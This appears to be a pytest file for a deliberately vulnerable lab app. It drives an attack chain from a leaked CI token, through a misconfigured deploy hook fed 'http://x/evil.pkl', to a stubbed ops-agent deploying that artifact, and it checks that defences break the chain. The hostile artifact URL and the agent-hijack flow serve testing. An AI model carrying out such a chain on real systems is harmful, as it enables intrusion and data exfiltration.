from fastapi.testclient import TestClient

from halcyon import crm_fixtures, kb_fixtures
from halcyon.bank import Bank
from halcyon.chain_state import ChainProvider
from halcyon.config import load_settings
from halcyon.kb import InMemoryKB
from halcyon.llm import FinalAnswer, StubLLM, StubToolLLM, ToolCall
from halcyon.mcp_host import in_memory_host
from halcyon.mcp_vault import SERVER_CORE, SERVER_CRM, TokenVault
from halcyon.store import InMemoryStore
from halcyon.web import create_app


def make_chain_client(env, ops_script):
    import itertools
    store = InMemoryStore()
    settings = load_settings(env)
    kb = InMemoryKB()
    kb.seed(kb_fixtures.SEED)
    bank = Bank()
    vault = TokenVault({SERVER_CORE: "c", SERVER_CRM: "d"})
    c = itertools.count(1)
    chain_for = ChainProvider(gen=lambda: f"tok-{next(c)}")
    tool_llm_factory = lambda p, m, k: StubToolLLM(list(ops_script))  # noqa: E731
    mcp_host_factory = lambda sid, s: in_memory_host(  # noqa: E731
        bank, vault, crm_fixtures.SEED, store, s, sid)
    app = create_app(
        store, settings, lambda p, m, k: StubLLM(""),
        lambda sid: kb, lambda sid: bank, tool_llm_factory, mcp_host_factory,
        chain_for=chain_for,
    )
    return TestClient(app), store, chain_for


def _drive_full_chain(client, chain_for, session="p1"):
    tok = chain_for(session).ci_token
    # S1: read the leak blob (records secret_leak_discovered iff the token survives
    # scrubbing -- under SEC_SECRET_SCANNING it won't, and that's the point of
    # test_secret_scanning_breaks_s1, so this call is not asserted on here; the
    # final /validate/chain check is what proves whether S1 actually fired).
    client.get("/source/blob", params={"session": session, "path": ".env.sample"})
    # S2: use the leaked token at the misconfigured deploy hook
    client.post("/internal/deploy", json={
        "session_id": session, "ci_token": tok, "artifact_url": "http://x/evil.pkl"})
    # S3-S5: drive the ops-agent, which deploys -> worker loads -> exfil -> callback
    client.post("/api/ops-agent", json={"session_id": session, "message": "run the runbook"})


def test_full_chain_vulnerable_core_pass():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    # S1 has to actually deliver the token to the participant, not just record
    # the audit event -- core=="pass" alone would not catch an endpoint that
    # fired SECRET_LEAK_DISCOVERED but returned {"content": ""}. The token in
    # the body is what a participant copies into /internal/deploy.
    tok = chain_for("p1").ci_token
    blob = client.get("/source/blob", params={"session": "p1", "path": ".env.sample"}).json()
    assert tok in blob["content"]
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"


def test_secret_scanning_breaks_s1():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable", "SEC_SECRET_SCANNING": "1"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    tok = chain_for("p1").ci_token
    blob = client.get("/source/blob", params={"session": "p1", "path": ".env.sample"}).json()
    assert tok not in blob["content"]                       # scrubbed
    _drive_full_chain(client, chain_for)                    # rest can't complete
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"


def test_ci_least_priv_breaks_s2():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable", "SEC_CI_LEAST_PRIV": "1"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"


def test_reset_chain_clears_pass_and_rotates_secret():
    client, store, chain_for = make_chain_client(
        {"HALCYON_MODE": "vulnerable"},
        [ToolCall("deploy", {"artifact_url": "http://x/evil.pkl"}), FinalAnswer("done")])
    old = chain_for("p1").vault_master
    _drive_full_chain(client, chain_for)
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "pass"
    client.post("/reset/chain", json={"session_id": "p1"})
    assert client.get("/validate/chain", params={"session": "p1"}).json()["core"] == "fail"
    assert chain_for("p1").vault_master != old
